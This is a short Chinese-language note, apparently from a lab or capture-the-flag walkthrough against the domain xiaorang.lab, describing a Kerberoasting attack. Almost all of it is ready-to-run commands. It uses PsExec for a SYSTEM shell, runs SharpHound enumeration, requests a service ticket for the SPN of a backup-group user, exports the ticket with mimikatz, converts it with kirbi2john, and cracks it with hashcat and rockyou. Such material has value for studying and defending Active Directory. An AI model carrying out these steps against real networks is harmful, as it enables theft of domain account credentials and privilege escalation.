收集 spn 信息

```bash
PsExec.exe -accepteula -s -i -d cmd.exe
SharpHound.exe -c all
```

TIANJING 这个域用户在备份组里, SPN 为 `'WWW/xr-0923.xiaorang.lab/IIS'`

* 申请 st

```bash
Import-Module .\Invoke-Kerberoast.ps1
$SPNName = 'WWW/xr-0923.xiaorang.lab/IIS'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName

# 查看SPN的ST
klist

# 用mimikatz导出请求的ST：
.\mimikatz.exe "privilege::debug" "kerberos::list /export" "exit" > 1.txt

# 票据保存重命名为1.kirbi了
python /usr/share/john/kirbi2john.py /tmp/1.kirbi > output.txt
# hashcat爆破spn-st
hashcat -m 13100 output.txt rockyou.txt --force
```
